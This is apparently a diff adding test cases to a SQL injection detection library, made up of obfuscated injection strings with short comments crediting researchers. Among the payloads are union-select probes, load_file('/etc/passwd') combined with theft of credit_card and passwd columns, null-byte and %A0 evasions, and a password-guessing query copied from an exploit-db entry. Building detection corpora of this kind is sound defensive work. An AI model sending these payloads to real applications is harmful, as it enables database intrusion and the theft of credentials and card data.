+binary (binary 1) union select table_name from information_schema.tables
+binary (binary 1) union select table_name from information_schema.tables
+
+# werid slash escaping in Older T-SQL databases
+# http://websec.ca/kb/sql_injection#MSSQL_Allowed_Intermediary_Chars_AND-OR
+\1=\1AND\1=\1;
+
+# more weird T-SQL weirdness
+\%250=\-1AND\*1=\/1
+
+# mysql
+-1 procedure analyse() union select table_name from information_schema.tables limit 1
+
+# HT @FluxReiners
+(1)mod @a or 1 union select load_file('/etc/passwd'),credit_card,passwd from users-- -
+@a mod (1) or 1 union select load_file('/etc/passwd'),credit_card,passwd from users-- -
+
+# HT @LightOS
+# issue here is how '1gfsdg..' is processed.
+# MySQL parses it as a single word, other databases treat it as "1", "gfs..."
+-1 procedure analyse(1gfsdgfds, sfg) union select table_name from information_schema.tables limit 1
+
+# HT @FluxReiners
+(select 1 foo) union select load_file('foo');
+
+#
+# Anonymous from  Research Institution of Telecom in Beijing, China
+#  commenting out since i have no idea how this could be a true SQL injection
+#=1 union select admin,pass from admin limit 1
+#=1 union select 1,2,3,4,5,6
+
+# problems with type-casting, and nested type casting
+#
+# credit: Reto Ischi
+#
+'s' || binary(1)# and n='foo"
+1 - binary (1 - binary(1)) UNION SELECT 2 --
+1 - binary (binary(1) -1) UNION SELECT 2 --
+binary (1 - binary(1)) UNION SELECT 2 --
+binary (binary(1) - 1) UNION SELECT 2 --
+binary (binary(1)) UNION SELECT 2 --
+
+#
+# Padding using between operator
+#
+(1 between @version and "2") & 1 UNION SELECT 1
+(1 between @version and @user) & 1 UNION SELECT 1
+(1 between 1 and @version) & 1 UNION SELECT 1
+(1 between '1' and @version) & 1 UNION SELECT 1
+(1 between 1 and 2) & 1 UNION SELECT 1
+(1 between '1' and '2') & 1 UNION SELECT 1
+(1 between 1 and '2') & 1 UNION SELECT 1
+(1 between '1' and 2) & 1 UNION SELECT 1
+('1' between '1' and '2') & 1 UNION SELECT 1
+(@version between '1' and '2') & 1 UNION SELECT 1
+(@version between 1 and '2') & 1 UNION SELECT 1
+
+#
+# ANY and SOME subqueries
+#
+1 - ANY(SELECT 1,2)
+ANY(SELECT 1) - 1 UNION ALL --
+ANY(SELECT (1)) - 1 UNION ALL --
+ANY((SELECT 1)) - 1 UNION ALL --
+1 - ANY(SELECT 1) UNION ALL --
+
+#
+# embedded %A0 mysql
+#
+1%A0UNION%A0SELECT%A02--
+1%00UNION%00SELECT%002--
+
+#
+# http://www.exploit-db.com/exploits/28854/
+#
+stringindatasetchoosen%25' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS where FULL_NAME like '%25dministrator' and rownum<=1 and PASSWORD like '0%25') and '1%25'='1
+
+#
+# Thanks to @rsalgado
+# A degenerate MySQL ODBC case
+#
+-{``.``.id} union select table_name FROM information_schema.tables LIMIT 1
